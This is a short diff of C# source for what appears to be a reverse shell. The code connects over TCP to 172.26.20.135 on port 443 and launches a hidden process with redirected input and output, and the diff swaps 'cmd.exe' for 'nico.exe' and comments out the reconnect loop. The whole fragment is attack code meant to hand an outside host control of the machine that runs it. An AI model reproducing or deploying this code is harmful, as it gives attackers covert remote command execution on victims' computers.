@@ -15,10 +15,10 @@ using System.Threading;
 
 		public Program()
 		{
-		while(true)
+		/*while(true)
 		{
 			Thread.Sleep(20);
-			
+		*/	
 			using(TcpClient client = new TcpClient("172.26.20.135", 443))
 			{
 				using(Stream stream = client.GetStream())
@@ -30,7 +30,7 @@ using System.Threading;
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.FileName = "nico.exe";
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
@@ -50,7 +50,7 @@ using System.Threading;
 				}
 			}
 			
-			}
+		/*	} */
 		}
 
 		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
